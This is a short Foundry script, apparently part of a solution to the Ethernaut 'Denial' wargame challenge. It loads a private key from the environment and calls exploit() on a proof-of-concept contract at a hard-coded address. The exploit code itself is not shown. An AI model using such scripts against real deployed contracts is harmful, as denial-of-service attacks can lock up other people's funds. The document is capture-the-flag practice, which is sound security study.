//
pragma solidity ^0.8.0;


import "forge-std/Script.sol";
import "Ethernaut/denial_poc.sol";


contract DenialPocScript is Script
{
  DenialPoc denial;

  function run() public 
  {
    uint256 deployerKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(deployerKey);

    DenialPoc poc = DenialPoc(0xDeE6e08EA336848260134Be662d68cF295E2B469);
    poc.exploit();

    vm.stopBroadcast();
  }
}